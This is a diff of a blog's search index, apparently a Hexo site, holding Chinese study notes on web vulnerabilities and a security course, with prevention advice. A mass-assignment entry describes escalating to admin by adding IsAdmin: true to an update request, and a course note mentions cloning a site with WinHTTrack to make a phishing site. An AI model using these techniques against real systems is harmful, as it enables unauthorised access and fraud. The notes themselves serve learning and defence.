+    <url>/2024/08/04/%E5%A4%A7%E9%87%8F%E8%B3%A6%E5%80%BC%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<ol>
-<li>漏洞定義：<ul>
-<li>「保護不足的憑證」漏洞指的是憑證未得到適當保護，這可能包括以純文本形式存儲或使用弱加密的憑證。</li>
+<li>什麼是大量賦值漏洞？<br>大量賦值漏洞是一種安全漏洞，當API端點允許用戶修改其相關對象的所有屬性時就可能發生。</li>
+<li>漏洞如何發生？<br>當HTTP請求中表示的對象直接綁定到用於存儲的數據模型上，並且沒有區分哪些字段應該是可賦值的，哪些是不可變的時，就可能發生大量賦值漏洞。這可能是由於某些框架的默認設置或開發者為了特定情況而有意作出的決定。</li>
+<li>示例：<ul>
+<li>黑客注意到應用程序使用同一個端點來檢索和更新用戶詳細信息。</li>
+<li>黑客發現他們檢索的用戶信息還包括了他們的角色信息，於是他們嘗試在更新請求中添加該字段。</li>
 </ul>
 </li>
-<li>漏洞風險：<ul>
-<li>如果攻擊者能夠訪問存儲憑證的地方，他們就能恢復這些憑證。</li>
+<li>漏洞利用：<ul>
+<li>黑客通過修改請求體，將自己的角色設置為管理員（IsAdmin: true），服務器接受了所有字段，更新了黑客的角色，從而使黑客獲得了管理員權限。</li>
 </ul>
 </li>
-<li>漏洞示例：<ul>
-<li>黑客組織針對一個允許企業主報告財務信息的網站發動攻擊，發現了該網站內容管理系統主題的多個漏洞，包括文件包含漏洞和目錄遍歷漏洞。</li>
-</ul>
-</li>
-<li>攻擊過程：<ul>
-<li>利用這些漏洞，黑客能夠下載網站的基本配置文件，該文件包含了訪問數據庫的用戶名和密碼。</li>
-</ul>
-</li>
-<li>漏洞後果：<ul>
-<li>黑客利用這些憑證訪問並更新用戶的財務設置和銀行詳細信息。</li>
-</ul>
-</li>
-<li>預防措施：<ul>
-<li>開發人員應該假設攻擊者將獲得對憑證存儲的訪問權，並確保憑證不被暴露。</li>
-<li>使用行業標準的安全機制或加密技術來保護憑證。</li>
-<li>尋找可能允許攻擊者訪問私鑰或密碼短語的任何信息。</li>
+<li>如何防止大量賦值漏洞：<ul>
+<li>解析請求值，而不是直接綁定到一個對象。</li>
+<li>使用簡化的數據傳輸對象（Data Transfer Object, DTO），而不是直接綁定到一個對象。</li>
+<li>確保敏感屬性被拒絕列表（denylist）或只允許安全的屬性被允許列表（allowlist）直接綁定到對象。</li>
 </ul>
 </li>
 </ol>
@@ -1534,36 +1564,6 @@
 </ol>
 <h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SECURE_REDIRECT_EXEMPT = [<span class="string">&#x27;api/login/&#x27;</span>, <span class="string">&#x27;user/login/&#x27;</span>]</span><br></pre></td></tr></table></figure>
 <p>將 [“api&#x2F;login&#x2F;,” “user&#x2F;login&#x2F;“] 清單設定為 SECURE_REDIRECT_EXEMPT 生產設定變數允許以純文字形式傳輸登入驗證憑證，從而使應用程式容易受到中間人或網路釣魚攻擊。</p>
-]]></content>
-      <categories>
-        <category>安全達人養成計劃研習</category>
-      </categories>
-      <tags>
-        <tag>網路漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>大量賦值漏洞</title>
-    <url>/2024/08/04/%E5%A4%A7%E9%87%8F%E8%B3%A6%E5%80%BC%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<ol>
-<li>什麼是大量賦值漏洞？<br>大量賦值漏洞是一種安全漏洞，當API端點允許用戶修改其相關對象的所有屬性時就可能發生。</li>
-<li>漏洞如何發生？<br>當HTTP請求中表示的對象直接綁定到用於存儲的數據模型上，並且沒有區分哪些字段應該是可賦值的，哪些是不可變的時，就可能發生大量賦值漏洞。這可能是由於某些框架的默認設置或開發者為了特定情況而有意作出的決定。</li>
-<li>示例：<ul>
-<li>黑客注意到應用程序使用同一個端點來檢索和更新用戶詳細信息。</li>
-<li>黑客發現他們檢索的用戶信息還包括了他們的角色信息，於是他們嘗試在更新請求中添加該字段。</li>
-</ul>
-</li>
-<li>漏洞利用：<ul>
-<li>黑客通過修改請求體，將自己的角色設置為管理員（IsAdmin: true），服務器接受了所有字段，更新了黑客的角色，從而使黑客獲得了管理員權限。</li>
-</ul>
-</li>
-<li>如何防止大量賦值漏洞：<ul>
-<li>解析請求值，而不是直接綁定到一個對象。</li>
-<li>使用簡化的數據傳輸對象（Data Transfer Object, DTO），而不是直接綁定到一個對象。</li>
-<li>確保敏感屬性被拒絕列表（denylist）或只允許安全的屬性被允許列表（allowlist）直接綁定到對象。</li>
-</ul>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>安全達人養成計劃研習</category>
@@ -1787,6 +1787,68 @@
       </tags>
   </entry>
   <entry>
+    <title>資安鑑識課程</title>
+    <url>/2024/08/04/%E8%B3%87%E5%AE%89%E9%91%91%E8%AD%98%E8%AA%B2%E7%A8%8B/</url>
+    <content><![CDATA[<ol>
+<li><strong>資訊安全七大需求</strong>：</li>
+</ol>
+<ul>
+<li><strong>包括稽核</strong>(Audit)</li>
+<li><strong>機密</strong>(Confidentiality)</li>
+<li><strong>鑑別</strong>(Authentication)</li>
+<li><strong>完整性</strong>(Integrity)</li>
+<li><strong>不可否認</strong>(Non-repudiation)</li>
+<li><strong>存取控制</strong>(Access Control)</li>
+<li><strong>可用性</strong>(Availability)</li>
+</ul>
+<ol start="2">
+<li><strong>資訊安全七大需求詳解</strong>：</li>
+</ol>
+<ul>
+<li><strong>機密性</strong>：確保資訊不被未授權使用者獲取，可透過資料加密實現。</li>
+<li><strong>完整性</strong>：確保資料在傳輸過程中不會被竄改，可透過數位簽章或雜湊函數保證。</li>
+<li><strong>鑑別性</strong>：確認資訊來源和使用者身份，防止惡意發送者假冒。</li>
+<li><strong>不可否認性</strong>：確保傳輸雙方不能否認資料傳輸或接收行為，通常透過數位簽章和PKI實現。</li>
+<li><strong>可用性</strong>：確保資訊系統正常運作，防止惡意破壞或延遲。</li>
+<li><strong>存取控制</strong>：根據使用者服務等級授予不同權限，防止未授權存取。</li>
+<li><strong>稽核</strong>：透過稽核日誌追蹤非法用戶，以便在入侵事件發生時快速回應。</li>
+</ul>
+<ol start="3">
+<li><strong>HASH函數與訊息鑑別碼介紹</strong>：</li>
+</ol>
+<ul>
+<li>雜湊函數將可變長度資訊產生固定長度的雜湊碼，具備錯誤偵測能力。</li>
+<li>雜湊函數的主要特性包括單向性、弱碰撞抵抗力和強碰撞抵抗力。</li>
+<li>常見的雜湊函數有MD5、SHA-1、SHA-2、SHA-3、RIPEMD、BLAKE2和Whirlpool。</li>
+</ul>
+<ol start="4">
+<li><strong>對稱式&#x2F;非對稱式密碼系統介紹</strong>：</li>
+</ol>
+<ul>
+<li>對稱式密碼系統使用單一金鑰進行加密和解密。</li>
+<li>非對稱式密碼系統使用一對公私鑰，適用於安全通訊和數位簽章。</li>
+</ul>
+<ol start="5">
+<li><p><strong>公私鑰對的製作與下載</strong>：介紹了使用Kleopatra軟體進行公私鑰對的製作與下載。</p>
+</li>
+<li><p><strong>明文加密與密文解密</strong>：討論了加密和解密的過程。</p>
+</li>
+<li><p><strong>數位簽章的產生與驗證</strong>：介紹如何使用私鑰產生數位簽章以及如何使用公鑰驗證簽章。</p>
+</li>
+<li><p><strong>釣魚網站製作</strong>：使用WinHTTrack Website copier軟體製作釣魚網站。</p>
+</li>
+<li><p><strong>參考資料</strong>：提供了參考書籍《資訊與網路安全概論-第六版》的資訊。</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>線上資安課程</category>
+      </categories>
+      <tags>
+        <tag>密碼學</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>明文儲存敏感資訊</title>
     <url>/2024/08/04/%E6%98%8E%E6%96%87%E5%84%B2%E5%AD%98%E6%95%8F%E6%84%9F%E8%B3%87%E8%A8%8A/</url>
     <content><![CDATA[<ol>
@@ -1817,41 +1879,6 @@
 </ol>
 <h4 id="範例"><a href="#範例" class="headerlink" title="範例"></a>範例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">username = form.cleaned_data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">password = form.cleaned_data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">new_user = User.create(username, password)</span><br><span class="line">new_user.save()</span><br></pre></td></tr></table></figure>
 <p>需要注意的是，這段代碼沒有顯示密碼加密的過程</p>
-]]></content>
-      <categories>
-        <category>安全達人養成計劃研習</category>
-      </categories>
-      <tags>
-        <tag>網路漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>資訊曝露 - 敏感性資料曝露</title>
-    <url>/2024/08/04/%E8%B3%87%E8%A8%8A%E6%9B%9D%E9%9C%B2-%E6%95%8F%E6%84%9F%E6%80%A7%E8%B3%87%E6%96%99%E6%9B%9D%E9%9C%B2/</url>
-    <content><![CDATA[<ol>
-<li>敏感數據暴露定義：<ul>
-<li>開發人員在應用程序和系統中未經授權地暴露敏感用戶數據，例如駭客或其他第三方可能訪問的數據。</li>
-</ul>
-</li>
-<li>敏感用戶數據類型：<ul>
-<li>包括個人可識別信息（PII）、支付卡行業（PCI）數據，以及受隱私法規（如通用數據保護辦法GDPR）保護的任何數據。</li>
-</ul>
-</li>
-<li>敏感數據暴露常見情況：<ul>
-<li>開發人員未能注意數據在其應用程序和系統中的使用和結合方式。</li>
-</ul>
-</li>
-<li>實際案例：<ul>
-<li>一個約會應用程序的服務器向客戶端發送響應，其中包含用戶的地理定位和個人信息。即使這些數據沒有直接顯示給用戶，敵手仍然可以檢查響應並發現每個用戶的坐標。</li>
-</ul>
-</li>
-<li>避免敏感數據暴露的建議：<ul>
-<li>確定數據的使用和結合位置。</li>
-<li>防止向用戶發送不必要的數據。</li>
-<li>通過加密確保GDPR、PCI和PII數據的安全。</li>
-</ul>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>安全達人養成計劃研習</category>
@@ -1976,68 +2003,6 @@
       </tags>
   </entry>
   <entry>
-    <title>資安鑑識課程</title>
-    <url>/2024/08/04/%E8%B3%87%E5%AE%89%E9%91%91%E8%AD%98%E8%AA%B2%E7%A8%8B/</url>
-    <content><![CDATA[<ol>
-<li><strong>資訊安全七大需求</strong>：</li>
-</ol>
-<ul>
-<li><strong>包括稽核</strong>(Audit)</li>
-<li><strong>機密</strong>(Confidentiality)</li>
-<li><strong>鑑別</strong>(Authentication)</li>
-<li><strong>完整性</strong>(Integrity)</li>
-<li><strong>不可否認</strong>(Non-repudiation)</li>
-<li><strong>存取控制</strong>(Access Control)</li>
-<li><strong>可用性</strong>(Availability)</li>
-</ul>
-<ol start="2">
-<li><strong>資訊安全七大需求詳解</strong>：</li>
-</ol>
-<ul>
-<li><strong>機密性</strong>：確保資訊不被未授權使用者獲取，可透過資料加密實現。</li>
-<li><strong>完整性</strong>：確保資料在傳輸過程中不會被竄改，可透過數位簽章或雜湊函數保證。</li>
-<li><strong>鑑別性</strong>：確認資訊來源和使用者身份，防止惡意發送者假冒。</li>
-<li><strong>不可否認性</strong>：確保傳輸雙方不能否認資料傳輸或接收行為，通常透過數位簽章和PKI實現。</li>
-<li><strong>可用性</strong>：確保資訊系統正常運作，防止惡意破壞或延遲。</li>
-<li><strong>存取控制</strong>：根據使用者服務等級授予不同權限，防止未授權存取。</li>
-<li><strong>稽核</strong>：透過稽核日誌追蹤非法用戶，以便在入侵事件發生時快速回應。</li>
-</ul>
-<ol start="3">
-<li><strong>HASH函數與訊息鑑別碼介紹</strong>：</li>
-</ol>
-<ul>
-<li>雜湊函數將可變長度資訊產生固定長度的雜湊碼，具備錯誤偵測能力。</li>
-<li>雜湊函數的主要特性包括單向性、弱碰撞抵抗力和強碰撞抵抗力。</li>
-<li>常見的雜湊函數有MD5、SHA-1、SHA-2、SHA-3、RIPEMD、BLAKE2和Whirlpool。</li>
-</ul>
-<ol start="4">
-<li><strong>對稱式&#x2F;非對稱式密碼系統介紹</strong>：</li>
-</ol>
-<ul>
-<li>對稱式密碼系統使用單一金鑰進行加密和解密。</li>
-<li>非對稱式密碼系統使用一對公私鑰，適用於安全通訊和數位簽章。</li>
-</ul>
-<ol start="5">
-<li><p><strong>公私鑰對的製作與下載</strong>：介紹了使用Kleopatra軟體進行公私鑰對的製作與下載。</p>
-</li>
-<li><p><strong>明文加密與密文解密</strong>：討論了加密和解密的過程。</p>
-</li>
-<li><p><strong>數位簽章的產生與驗證</strong>：介紹如何使用私鑰產生數位簽章以及如何使用公鑰驗證簽章。</p>
-</li>
-<li><p><strong>釣魚網站製作</strong>：使用WinHTTrack Website copier軟體製作釣魚網站。</p>
-</li>
-<li><p><strong>參考資料</strong>：提供了參考書籍《資訊與網路安全概論-第六版》的資訊。</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>線上資安課程</category>
-      </categories>
-      <tags>
-        <tag>密碼學</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>遺漏功能層級存取控制</title>
     <url>/2024/08/04/%E9%81%BA%E6%BC%8F%E5%8A%9F%E8%83%BD%E5%B1%A4%E7%B4%9A%E5%AD%98%E5%8F%96%E6%8E%A7%E5%88%B6/</url>
     <content><![CDATA[<ol>
@@ -2059,6 +2024,41 @@
 <li>授權應該使用集中化的例程，可以是框架提供的或容易使用的外部模塊。</li>
 <li>默認情況下拒絕訪問，並實施最小權限原則。</li>
 <li>在服務器端實施功能訪問控制，而不是客戶端。</li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>安全達人養成計劃研習</category>
+      </categories>
+      <tags>
+        <tag>網路漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>資訊曝露 - 敏感性資料曝露</title>
+    <url>/2024/08/04/%E8%B3%87%E8%A8%8A%E6%9B%9D%E9%9C%B2-%E6%95%8F%E6%84%9F%E6%80%A7%E8%B3%87%E6%96%99%E6%9B%9D%E9%9C%B2/</url>
+    <content><![CDATA[<ol>
+<li>敏感數據暴露定義：<ul>
+<li>開發人員在應用程序和系統中未經授權地暴露敏感用戶數據，例如駭客或其他第三方可能訪問的數據。</li>
+</ul>
+</li>
+<li>敏感用戶數據類型：<ul>
+<li>包括個人可識別信息（PII）、支付卡行業（PCI）數據，以及受隱私法規（如通用數據保護辦法GDPR）保護的任何數據。</li>
+</ul>
+</li>
+<li>敏感數據暴露常見情況：<ul>
+<li>開發人員未能注意數據在其應用程序和系統中的使用和結合方式。</li>
+</ul>
+</li>
+<li>實際案例：<ul>
+<li>一個約會應用程序的服務器向客戶端發送響應，其中包含用戶的地理定位和個人信息。即使這些數據沒有直接顯示給用戶，敵手仍然可以檢查響應並發現每個用戶的坐標。</li>
+</ul>
+</li>
+<li>避免敏感數據暴露的建議：<ul>
+<li>確定數據的使用和結合位置。</li>
+<li>防止向用戶發送不必要的數據。</li>
+<li>通過加密確保GDPR、PCI和PII數據的安全。</li>
 </ul>
 </li>
 </ol>
